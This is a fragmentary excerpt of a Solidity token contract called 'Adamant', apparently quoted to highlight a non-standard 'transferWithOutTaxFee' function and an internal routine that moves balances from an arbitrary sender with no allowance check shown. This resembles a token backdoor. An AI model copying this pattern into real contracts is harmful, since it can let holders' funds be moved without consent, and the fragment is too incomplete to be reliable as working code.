...
interface IERC20 {
    ...
    function transferWithOutTaxFee(address sender, address recipient, uint256 amount) external returns (bool);
...
contract Adamant is Context, IERC20, Ownable {
    ...
    function _approve(address owner, address spender, uint256 amount) private {
     ...
     function transferWithOutTaxFee(
        address from,
        address to,
        uint256 amount
    ...
    function claimRewards(address _recipient,uint256 _amount) public onlyOwner() {
      ...
      function _withOutTaxFee(address _sender, address _recipient, uint256 _tAmount) internal {
        _rOwned[_sender] = _rOwned[_sender].sub(_tAmount);
        _rOwned[_recipient] = _rOwned[_recipient].add(_tAmount);
